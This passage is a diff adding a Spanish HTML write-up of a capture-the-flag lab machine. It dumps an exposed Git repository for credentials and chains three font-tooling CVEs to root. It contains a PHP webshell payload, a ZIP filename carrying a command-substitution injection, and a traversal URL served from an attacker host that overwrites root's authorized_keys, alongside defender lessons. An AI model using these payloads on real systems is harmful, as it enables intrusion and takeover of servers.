+    <p><strong>Concepto clave:</strong> Un repositorio Git expuesto (<code>/.git/</code> accesible vía HTTP) es una de las vulnerabilidades de configuración más graves. Git almacena no solo el código actual, sino <em>todo el historial</em>, incluyendo archivos eliminados y credenciales que alguna vez existieron.</p>
+  </div>
+
+  <div class="cmd-annotated">
+    <div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-s</span> <span class="param">http://portal.variatype.htb/.git/HEAD</span></div>
+    <div class="cmd-line" style="margin-top:.5rem"><span class="cmd">git-dumper</span> <span class="param">http://portal.variatype.htb/.git/</span> <span class="param">./portal_repo</span></div>
+  </div>
+
+  <div class="output-box">
+    <div class="output-label">Output</div>
+    <pre>ref: refs/heads/main
+[-] Testing http://portal.variatype.htb/.git/HEAD [200]
+[-] Fetching .git/...
+[-] Running git checkout .</pre>
+  </div>
+
+  <h3>2.1 — Análisis del historial de commits</h3>
+
+  <div class="cmd-annotated">
+    <div class="cmd-line"><span class="cmd">git log</span> <span class="flag-opt">--oneline --all</span></div>
+  </div>
+
+  <div class="output-box">
+    <div class="output-label">Output</div>
+    <pre>753b5f5 (HEAD -> main) fix: add gitbot user for automated validation pipeline
+a1e3c20 feat: portal dashboard with font upload functionality
+f8b2d11 init: initial portal structure</pre>
+  </div>
+
+  <h3>2.2 — Búsqueda de dangling commits</h3>
+
+  <div class="why-box">
+    <strong>¿Qué es un dangling commit?</strong>
+    <p>En Git, cuando se hace un <code>git commit --amend</code> o un <code>git rebase</code>, el commit original no se borra del objeto store — simplemente pierde su referencia. <code>git fsck</code> puede encontrar estos objetos huérfanos.</p>
+  </div>
+
+  <div class="cmd-annotated">
+    <div class="cmd-line"><span class="cmd">git fsck</span> <span class="flag-opt">--no-reflog --full --unreachable</span> | <span class="cmd">grep</span> <span class="param">commit</span></div>
+    <div class="cmd-line" style="margin-top:.5rem"><span class="cmd">git show</span> <span class="param">6f021da6be7086f2595befaa025a83d1de99478b</span></div>
+  </div>
+
+  <div class="output-box">
+    <div class="output-label">Output — Credenciales en commit huérfano</div>
+    <pre>unreachable commit 6f021da6be7086f2595befaa025a83d1de99478b
+
+commit 6f021da6be7086f2595befaa025a83d1de99478b
+    security: remove hardcoded credentials
+
+diff --git a/auth.php b/auth.php
+-    $valid_users = [
+-        'gitbot' => 'G1tB0t_Acc3ss_2025!',
+-        'admin'  => 'AdminPortal_2025#',
+-    ];
++    $valid_users = load_users_from_db();</pre>
+  </div>
+
+  <div class="interpret-box">
+    <strong>Interpretación</strong>
+    <p>El commit "borrado" contiene credenciales hardcodeadas. <strong>Credenciales obtenidas: <code>gitbot:G1tB0t_Acc3ss_2025!</code></strong></p>
+  </div>
+
+  <div class="vuln-card">
+    <h3>⚠ ¿Por qué es vulnerable?</h3>
+    <p style="font-size:.9rem;color:var(--text2)"><strong>Causa raíz 1:</strong> El directorio <code>.git/</code> no está bloqueado por nginx.<br><strong>Causa raíz 2:</strong> El desarrollador creyó que eliminar las credenciales en un nuevo commit era suficiente. En Git, el historial es inmutable — <code>git filter-repo</code> o <code>BFG Repo Cleaner</code> deben usarse para purgar datos sensibles.</p>
+  </div>
+
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>🗡 Para el atacante</h4>
+      <ul><li>Siempre verificar <code>/.git/HEAD</code> en targets web</li><li>git-dumper + git fsck es el combo estándar para extraer secretos</li><li>Los mensajes como "remove credentials" son señales de que existieron datos sensibles</li></ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡 Para el defensor</h4>
+      <ul><li>Bloquear <code>/.git/</code> en el servidor web</li><li>Nunca poner credenciales en código</li><li>Si se commitearon, rotarlas y purgar con filter-repo</li></ul>
+    </div>
+  </div>
+</div>
+
+<!-- PASO 03 - LOGIN -->
+<div class="section" id="login">
+  <div class="section-header">
+    <div class="section-num">03</div>
+    <h2>Autenticación en el Portal PHP</h2>
+  </div>
+
+  <div class="cmd-annotated">
+    <div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-s -c cookies.txt -b cookies.txt -X POST</span> <span class="param">http://portal.variatype.htb/</span> <span class="flag-opt">-d</span> <span class="param">"username=gitbot&amp;password=G1tB0t_Acc3ss_2025!"</span> <span class="flag-opt">-L -o</span> <span class="param">dashboard.html</span></div>
+  </div>
+
+  <div class="output-box">
+    <div class="output-label">Output</div>
+    <pre>&lt;title&gt;VariaType Portal — Dashboard&lt;/title&gt;
+&lt;a href="/tools/submit-font"&gt;Submit Font Package (.zip)&lt;/a&gt;</pre>
+  </div>
+
+  <div class="interpret-box">
+    <strong>Interpretación</strong>
+    <p>Login exitoso. El dashboard muestra generación de fuentes variables y envío de paquetes ZIP. Ambas son superficies de ataque.</p>
+  </div>
+</div>
+
+<!-- PASO 04 - CVE-2025-66034 -->
+<div class="section" id="cve-66034">
+  <div class="section-header">
+    <div class="section-num red">04</div>
+    <h2>CVE-2025-66034 — fontTools Arbitrary File Write → RCE</h2>
+  </div>
+
+  <div class="cve-badge">CVE-2025-66034 · fontTools varLib · CVSS: 9.8 Critical</div>
+
+  <div class="info-box">
+    <p><strong>¿Qué es fontTools?</strong> fontTools es una librería Python para manipular fuentes tipográficas. Su módulo <code>varLib</code> procesa archivos <code>.designspace</code> para generar fuentes variables.</p>
+  </div>
+
+  <div class="vuln-card">
+    <h3>⚠ ¿Cuál es el bug?</h3>
+    <p style="font-size:.9rem;color:var(--text2)">En un archivo <code>.designspace</code>, el atributo <code>filename</code> del <code>&lt;variable-font&gt;</code> se usa directamente como path de escritura <strong>sin aplicar <code>os.path.basename()</code></strong>. Un atacante puede especificar un path absoluto y fontTools escribirá el binario TTF generado en esa ubicación.</p>
+  </div>
+
+  <div class="ascii-diagram">
+<span class="hl">ATTACKER</span>                    <span class="hl">variatype.htb</span>                <span class="hl">portal.variatype.htb</span>
+    |                              |                              |
+    |-- POST /tools/variable- ---->|                              |
+    |   font-generator/process     |                              |
+    |   (malicious.designspace)    |                              |
+    |                              |                              |
+    |                    <span class="hl-orange">fontTools varLib processes .designspace</span>    |
+    |                    <span class="hl-red">reads filename="/var/www/portal/shell.php"</span>  |
+    |                    <span class="hl-red">NO os.path.basename() applied!</span>            |
+    |                              |                              |
+    |                    Writes TTF binary to:                    |
+    |                    /var/www/portal/files/<span class="hl-green">shell.php</span>    ----->|
+    |                              |                              |
+    |-- GET /files/shell.php?cmd=id --------------------------->|
+    |                                        <span class="hl-green">uid=33(www-data)</span>    |</div>
+
+  <h3>Construcción del Exploit</h3>
+
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Crear master fonts TTF mínimas</div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">python3</span> <span class="param">make_masters.py</span></div>
+      <div class="cmd-notes">
+        <div class="cmd-note">Genera source-light.ttf (weight 300) y source-regular.ttf (weight 400) con fontBuilder</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 2 — Crear malicious.designspace</div>
+    <div class="output-box">
+      <div class="output-label">malicious.designspace (extracto clave)</div>
+      <pre>&lt;variable-font
+  filename="/var/www/portal.variatype.htb/public/files/shell.php"&gt;
+  &lt;axis-subsets&gt;
+    &lt;axis-subset name="Weight"/&gt;  &lt;!-- CRÍTICO: name del eje, NO el tag --&gt;
+  &lt;/axis-subsets&gt;
+&lt;/variable-font&gt;
+
+&lt;!-- Payload PHP embebido en la name table via labelname --&gt;
+&lt;labelname&gt;&lt;![CDATA[&lt;?php system($_GET['cmd']); ?&gt;]]&gt;&lt;/labelname&gt;</pre>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 3 — Subir y verificar RCE</div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-s -F</span> <span class="param">"designspace=@malicious.designspace"</span> <span class="flag-opt">-F</span> <span class="param">"masters=@source-light.ttf"</span> <span class="flag-opt">-F</span> <span class="param">"masters=@source-regular.ttf"</span> <span class="ip">http://variatype.htb/tools/variable-font-generator/process</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">RCE confirmado</div>
+      <pre>$ curl -s "http://portal.variatype.htb/files/shell.php?cmd=id"
+[binary TTF data...]uid=33(www-data) gid=33(www-data) groups=33(www-data)[binary...]</pre>
+    </div>
+  </div>
+
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>🗡 Para el atacante</h4>
+      <ul><li>El atributo <code>filename</code> en formatos XML es siempre candidato a path traversal</li><li>Los formatos de fuentes (.designspace, .ufo) son ricos en estos vectores</li></ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡 Para el defensor</h4>
+      <ul><li>Usar <code>os.path.basename()</code> en todos los paths de salida</li><li>Ejecutar procesadores en sandbox/containers</li></ul>
+    </div>
+  </div>
+</div>
+
+<!-- PASO 05 - CVE-2024-25081 -->
+<div class="section" id="cve-25081">
+  <div class="section-header">
+    <div class="section-num" style="background:var(--green);color:var(--ink)">05</div>
+    <h2>CVE-2024-25081 — FontForge ZIP Injection → steve</h2>
+  </div>
+
+  <div class="cve-badge">CVE-2024-25081 · FontForge · CVSS: 8.8 High</div>
+
+  <div class="info-box">
+    <p><strong>¿Qué es FontForge?</strong> Editor de fuentes open source que puede procesar ZIPs. Internamente extrae archivos y pasa sus nombres a <code>system()</code> sin escapado adecuado.</p>
+  </div>
+
+  <div class="ascii-diagram">
+ATTACKER (www-data)           CRON (steve, cada hora)           SISTEMA
+     |                               |                              |
+     | Sube evil.zip al              |                              |
+     | directorio watch              |                              |
+     |                     fontforge --script validate.pe evil.zip  |
+     |                               |                              |
+     |                     <span class="hl-red">FontForge abre el ZIP</span>                   |
+     |                     <span class="hl-red">Extrae archivo interno: "$(cmd).ttf"</span>     |
+     |                     <span class="hl-red">system("proceso $(cmd).ttf")</span>           |
+     |                     bash expande $() → <span class="hl-green">ejecuta cmd</span>          |
+     |                               |                              |
+     |                     <span class="hl-green">mkdir /home/steve/.ssh</span>                  |
+     |                     <span class="hl-green">echo pubkey >> authorized_keys</span>          |
+     |                               |                              |
+     |--- SSH -i steve_key steve@ -------------------------------->|</div>
+
+  <div class="step-box">
+    <div class="step-number">Crear evil.zip con nombre malicioso interno</div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">python3</span> <span class="flag-opt">-c</span> <span class="param">"import zipfile; malicious_name='$(mkdir -p /home/steve/.ssh && echo pubkey >> .ssh/authorized_keys).ttf'; ..."</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Verificación</div>
+      <pre>$ python3 -c "import zipfile; z=zipfile.ZipFile('evil.zip'); print(z.namelist())"
+['$(mkdir -p /home/steve/.ssh && echo "ssh-ed25519 AAAA..." >> authorized_keys).ttf']</pre>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">SSH como steve — user.txt</div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">ssh</span> <span class="flag-opt">-i</span> <span class="param">steve_key</span> <span class="ip">steve@10.129.7.218</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Flag</div>
+      <pre>steve@variatype:~$ cat user.txt
+a35e7e84156b33d5d11b4e196fa67663</pre>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-label">user.txt</div>
+    <div class="flag-value">a35e7e84156b33d5d11b4e196fa67663</div>
+  </div>
+</div>
+
+<!-- PASO 06 - CVE-2025-47273 -->
+<div class="section" id="cve-47273">
+  <div class="section-header">
+    <div class="section-num orange">06</div>
+    <h2>CVE-2025-47273 — setuptools Path Traversal → root</h2>
+  </div>
+
+  <div class="cve-badge">CVE-2025-47273 · setuptools PackageIndex · CVSS: 9.1 Critical</div>
+
+  <div class="info-box">
+    <p><strong>¿Qué es setuptools.package_index?</strong> Módulo de la librería estándar de Python para instalar paquetes. Su método <code>download(url, dest_dir)</code> descarga archivos desde URLs. La vulnerabilidad está en cómo construye el path local: decodifica <code>%2F</code> y lo usa como path absoluto.</p>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Enumeración de privilegios sudo</div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">sudo -l</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>User steve may run the following commands on variatype:
+    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *</pre>
+    </div>
+  </div>
+
+  <div class="vuln-card">
+    <h3>⚠ ¿Cuál es el bug?</h3>
+    <p style="font-size:.9rem;color:var(--text2)"><code>PackageIndex.download()</code> extrae el nombre de archivo de la URL con <code>urllib.parse.unquote()</code>. Cuando la URL contiene <code>%2F</code>, se decodifica como <code>/</code>, creando un path absoluto. En Python, <code>os.path.join('/base/', '/absolute/path')</code> retorna <code>/absolute/path</code> — ignorando el directorio base.</p>
+  </div>
+
+  <div class="ascii-diagram">
+ATTACKER (steve)               HTTP SERVER (LHOST:5555)          SISTEMA
+     |                               |                              |
+     | sudo python3 install_validator.py                           |
+     | 'http://10.10.15.129:5555/<span class="hl-orange">%2Froot%2F.ssh%2Fauthorized_keys</span>'  |
+     |                               |                              |
+     |       <span class="hl-orange">setuptools.PackageIndex.download(url, dest)</span>             |
+     |       <span class="hl-orange">filename = unquote("%2Froot%2F.ssh%2Fauthorized_keys")</span>  |
+     |       <span class="hl-orange">filename = "/root/.ssh/authorized_keys"</span>                 |
+     |                               |                              |
+     |       <span class="hl-red">os.path.join("/opt/.../validators/",</span>                    |
+     |       <span class="hl-red">               "/root/.ssh/authorized_keys")</span>              |
+     |       <span class="hl-red">= "/root/.ssh/authorized_keys"  ← path absoluto!</span>        |
+     |                               |                              |
+     |       open("/root/.ssh/authorized_keys", "wb").write(pubkey)|
+     |                                                    <span class="hl-green">[key written]</span></div>
+
+  <div class="step-box">
+    <div class="step-number">Exploit y root</div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">sudo</span> <span class="param">/usr/bin/python3 /opt/font-tools/install_validator.py</span> <span class="flag-opt">'http://10.10.15.129:5555/%2Froot%2F.ssh%2Fauthorized_keys'</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>Plugin installed at: /root/.ssh/authorized_keys</pre>
+    </div>
+
+    <div class="cmd-annotated" style="margin-top:1rem">
+      <div class="cmd-line"><span class="cmd">ssh</span> <span class="flag-opt">-i</span> <span class="param">root_key</span> <span class="ip">root@10.129.7.218</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Root</div>
+      <pre>root@variatype:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@variatype:~# cat root.txt
+ddf4b11fd562904c07a263ada72c4de7</pre>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-label">root.txt</div>
+    <div class="flag-value">ddf4b11fd562904c07a263ada72c4de7</div>
+    <p style="color:var(--text3);font-size:.8rem;margin-top:.75rem;">PWNED — Full root access obtained.</p>
+  </div>
+
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>🗡 Para el atacante</h4>
+      <ul><li>Los comodines (*) en reglas sudo son extremadamente peligrosos</li><li>CVEs de path traversal en librerías Python populares tienen impacto masivo</li><li>Los cron jobs que procesan archivos subidos son vectores clásicos de escalada</li></ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡 Para el defensor</h4>
+      <ul><li>Evitar comodines en reglas sudo</li><li>Mantener setuptools actualizado</li><li>Validar nombres de archivos internos en ZIPs</li><li>Usar <code>NOPASSWD</code> con extrema cautela</li></ul>
+    </div>
+  </div>
+</div>
+
+<!-- MITRE -->
+<div class="section" id="mitre">
+  <h2>MITRE ATT&amp;CK</h2>
+  <table class="data-table">
+    <tr><th>ID</th><th>Técnica</th><th>Descripción</th></tr>
+    <tr><td><code>T1046</code></td><td>Network Service Discovery</td><td>Nmap + ffuf para descubrir servicios y vhosts</td></tr>
+    <tr><td><code>T1213</code></td><td>Data from Info Repositories</td><td>Git repository exposed con git-dumper</td></tr>
+    <tr><td><code>T1552.001</code></td><td>Credentials in Files</td><td>Credenciales en dangling commit de Git</td></tr>
+    <tr><td><code>T1190</code></td><td>Exploit Public-Facing App</td><td>CVE-2025-66034 fontTools path traversal → RCE</td></tr>
+    <tr><td><code>T1059.004</code></td><td>Unix Shell</td><td>Webshell PHP + command injection vía ZIP</td></tr>
+    <tr><td><code>T1053.003</code></td><td>Cron</td><td>Cron job de steve procesa ZIPs con FontForge</td></tr>
+    <tr><td><code>T1548.003</code></td><td>Sudo and Sudo Caching</td><td>CVE-2025-47273 setuptools + sudo misconfiguration</td></tr>
+  </table>
+</div>
+
+<!-- GLOSARIO -->
+<div class="section" id="glosario">
+  <div class="section-header">
+    <div class="section-num purple">G</div>
+    <h2>Glosario</h2>
+  </div>
+
+  <div class="glossary-grid">
+    <div class="glossary-card"><div class="term">Virtual Host (VHost)</div><div class="def">Configuración que permite alojar múltiples sitios en la misma IP, diferenciados por el header HTTP Host.</div></div>
+    <div class="glossary-card"><div class="term">git-dumper</div><div class="def">Herramienta que descarga un repositorio Git expuesto vía HTTP, reconstruyendo la estructura completa.</div></div>
+    <div class="glossary-card"><div class="term">Dangling Commit</div><div class="def">Commit que ha perdido todas sus referencias pero permanece en el object store de Git.</div></div>
+    <div class="glossary-card"><div class="term">fontTools</div><div class="def">Librería Python para manipular fuentes tipográficas. Su módulo varLib compila fuentes variables desde .designspace.</div></div>
+    <div class="glossary-card"><div class="term">Path Traversal</div><div class="def">Vulnerabilidad donde un atacante controla componentes de un path para escribir fuera del directorio permitido.</div></div>
+    <div class="glossary-card"><div class="term">FontForge</div><div class="def">Editor de fuentes open source. Soporta scripts de automatización y procesamiento de ZIPs con fuentes.</div></div>
+    <div class="glossary-card"><div class="term">ZIP Filename Injection</div><div class="def">Técnica de ataque donde se manipulan los nombres internos de un ZIP para inyectar comandos del sistema.</div></div>
+    <div class="glossary-card"><div class="term">Command Substitution</div><div class="def">Característica de bash que ejecuta $(comando) y sustituye la expresión con el output.</div></div>
+    <div class="glossary-card"><div class="term">setuptools.PackageIndex</div><div class="def">Componente de setuptools para gestionar descarga de paquetes. Vector de CVE-2025-47273.</div></div>
+    <div class="glossary-card"><div class="term">authorized_keys</div><div class="def">Archivo en ~/.ssh/ con claves públicas SSH autorizadas para autenticar sin contraseña.</div></div>
+  </div>
+</div>
+
+</main>
+
+<!-- SIDEBAR -->
+<aside class="sidebar">
+  <div class="sidebar-card">
+    <h4>Ficha Técnica</h4>
+    <div class="meta-row"><span class="meta-label">IP</span><span class="meta-value">10.129.7.218</span></div>
+    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Linux (Debian 12)</span></div>
+    <div class="meta-row"><span class="meta-label">Puertos</span><span class="meta-value">22, 80</span></div>
+    <div class="meta-row"><span class="meta-label">Dificultad</span><span class="meta-value" style="color:var(--yellow)">Medium</span></div>
+    <div class="meta-row"><span class="meta-label">LHOST</span><span class="meta-value">10.10.15.129</span></div>
+    <div class="meta-row"><span class="meta-label">Fecha</span><span class="meta-value">2026-03-24</span></div>
+    <div class="meta-row"><span class="meta-label">CVEs</span><span class="meta-value" style="color:var(--red)">3</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Herramientas</h4>
+    <div class="tool-list">
+      <span class="tool-tag">nmap</span>
+      <span class="tool-tag">ffuf</span>
+      <span class="tool-tag">gobuster</span>
+      <span class="tool-tag">git-dumper</span>
+      <span class="tool-tag">curl</span>
+      <span class="tool-tag">python3</span>
+      <span class="tool-tag">fontTools</span>
+      <span class="tool-tag">ssh-keygen</span>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Tabla de Contenidos</h4>
+    <a href="#resumen" class="toc-link">Resumen Ejecutivo</a>
+    <a href="#timeline" class="toc-link">Timeline de Ataque</a>
+    <a href="#recon" class="toc-link">01 · Reconocimiento</a>
+    <a href="#git" class="toc-link">02 · Git Exposed</a>
+    <a href="#login" class="toc-link">03 · Login</a>
+    <a href="#cve-66034" class="toc-link">04 · CVE-2025-66034</a>
+    <a href="#cve-25081" class="toc-link">05 · CVE-2024-25081</a>
+    <a href="#cve-47273" class="toc-link">06 · CVE-2025-47273</a>
+    <a href="#mitre" class="toc-link">MITRE ATT&CK</a>
+    <a href="#glosario" class="toc-link">Glosario</a>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>MITRE ATT&amp;CK</h4>
+    <span class="mitre-tag">T1046</span><span class="mitre-tag">T1213</span>
+    <span class="mitre-tag">T1552.001</span><span class="mitre-tag">T1190</span>
+    <span class="mitre-tag">T1059.004</span><span class="mitre-tag">T1053.003</span>
+    <span class="mitre-tag">T1548.003</span>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Credenciales</h4>
+    <span class="cred-tag">gitbot:G1tB0t_Acc3ss_2025!</span>
+    <span class="cred-tag">admin:AdminPortal_2025#</span>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Flags</h4>
+    <div class="meta-row"><span class="meta-label">user.txt</span><span class="meta-value" style="color:var(--green);font-size:.7rem">a35e7e84...67663</span></div>
+    <div class="meta-row"><span class="meta-label">root.txt</span><span class="meta-value" style="color:var(--green);font-size:.7rem">ddf4b11f...4de7</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Glosario Rápido</h4>
+    <div class="glosario-item"><span class="glosario-term">VHost</span><span class="glosario-def">Múltiples sitios en misma IP vía header Host</span></div>
+    <div class="glosario-item"><span class="glosario-term">.designspace</span><span class="glosario-def">XML que define ejes y masters de fuentes variables</span></div>
+    <div class="glosario-item"><span class="glosario-term">Webshell</span><span class="glosario-def">Archivo que permite RCE vía peticiones HTTP</span></div>
+    <div class="glosario-item"><span class="glosario-term">NOPASSWD</span><span class="glosario-def">Regla sudo sin pedir contraseña</span></div>
+  </div>
+</aside>
+</div>
+</body>
+</html>
